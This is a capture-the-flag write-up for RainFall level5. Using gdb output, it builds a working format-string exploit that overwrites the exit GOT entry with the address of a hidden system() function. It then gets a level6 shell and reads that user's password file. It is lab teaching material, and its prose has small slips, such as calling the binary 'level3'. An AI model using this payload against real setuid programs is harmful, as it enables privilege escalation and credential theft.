```sh
level5@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level5 level5   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level5 level5  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level5 level5 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level6 users  5385 Mar  6  2016 level5
-rw-r--r--+ 1 level5 level5   65 Sep 23  2015 .pass
-rw-r--r--  1 level5 level5  675 Apr  3  2012 .profile
level5@RainFall:~$ ./level5
42
42
level5@RainFall:~$ ./level5 42
42
42
```
There is one excutable file **level3**, it works like cat, take standard input, print them and shutting down. \
\
Run the binary file with GDB.
```sh
(gdb) info functions
...
0x080484a4  o
0x080484c2  n
0x08048504  main
...
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
(gdb) disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
   End of assembler dump.
   (gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave  
   0x08048510 <+12>:    ret    
End of assembler dump.
```
We can see 3 functions ```main(), n(), o()```. ```n()``` function gets standard input by ```fgets()``` and ```printf()``` without formatter. ```o()``` function have ```system()``` call, but its called by anywhere. \
We will be try same things like previous level, but now we have to call function ```o()```.
```sh
level5@RainFall:~$ python -c 'print "BBBB" + " %x" * 10' > /tmp/exploit5
level5@RainFall:~$ cat /tmp/exploit5 | ./level5
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520 25207825 78252078
level5@RainFall:~$ 
```
Now we can find easliy the input located in 4th of stack, we will replace the address of exit just after ```printf()``` by function ```o()```.
```sh
(gdb) disas n
Dump of assembler code for function n:
...
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
(gdb) x/i 0x080483d0
   0x80483d0 <exit@plt>:        jmp    *0x8049838
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
...
```
The start address of function ```o()``` is 0x80484a4, in decimal 134513828.
```
original exit address + o() start address - 4 + %4$n
```
```sh
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit5
level5@RainFall:~$ cat /tmp/exploit5 - | ./level5
...
whoami
level6
cat /home/user/level6/.pass
(hidden)
```
level5 passed !

